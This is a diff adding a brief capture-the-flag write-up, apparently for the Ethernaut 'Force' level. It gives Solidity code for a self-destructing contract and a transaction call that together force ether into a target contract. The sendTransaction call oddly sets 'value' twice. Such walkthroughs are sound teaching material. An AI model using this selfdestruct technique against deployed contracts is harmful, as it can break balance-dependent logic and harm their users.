@@ -1,0 +1,17 @@
+1) I created a contract with a fallback payable function and a selfdestruct function and deployed it.
+
+pragma solidity ^0.6.0;
+contract hackForce {
+    fallback() external payable{
+    }
+    function destroy(address payable _owner) public{
+        selfdestruct(_owner);
+    }
+}
+
+2) Then I sent ether to contract hackForce.
+await sendTransaction({from:player,value:toWei(0.0003),
+to:"0x2113105d9E6D688A684325b489ff7f0d5986Ef3F",value:0x00000ef111})
+
+3) Then I called hackForce's destroy function with the contract Force instance address
+ as argument which made it to send all the ether in the contract to Force.
